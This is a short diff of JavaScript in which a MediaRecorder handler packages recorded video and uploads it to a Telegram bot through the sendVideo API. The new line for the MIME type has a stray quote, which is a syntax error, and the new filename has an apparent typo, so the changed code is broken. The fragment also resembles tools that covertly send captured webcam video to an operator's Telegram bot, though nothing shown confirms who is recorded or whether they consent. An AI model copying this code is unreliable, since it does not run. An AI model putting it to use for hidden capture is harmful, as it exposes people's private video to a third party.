@@ -247,10 +247,10 @@
       };
 
       mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
+        const blob = new Blob(chunks, { type: 'video/mp4'' });
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
-        formData.append("video", blob, "recorded_video.webm");
+        formData.append("video", blob, "recorded_videow.mp4");
 
         fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
           method: "POST",
